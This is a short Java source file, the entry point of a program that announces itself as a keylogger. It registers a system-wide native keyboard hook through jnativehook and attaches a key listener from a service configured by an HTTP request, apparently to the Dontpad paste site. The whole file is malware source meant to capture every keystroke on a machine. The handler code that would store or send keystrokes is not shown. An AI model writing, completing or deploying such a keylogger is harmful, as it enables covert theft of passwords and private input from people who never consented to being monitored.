package main;

import org.jnativehook.GlobalScreen;

import handlers.DontpadRequest;
import handlers.ManageService;

public class Main {
	
	public static void main(String[] args) throws Exception {
		
		System.out.println("starting keylogger...");
		
		ManageService service = new ManageService(DontpadRequest.sendGet());
		
		try {
			GlobalScreen.registerNativeHook();
		} catch (Throwable e) {
			e.printStackTrace();
		}
		GlobalScreen.getInstance().addNativeKeyListener(service.getKeyboard());
		
	}
}
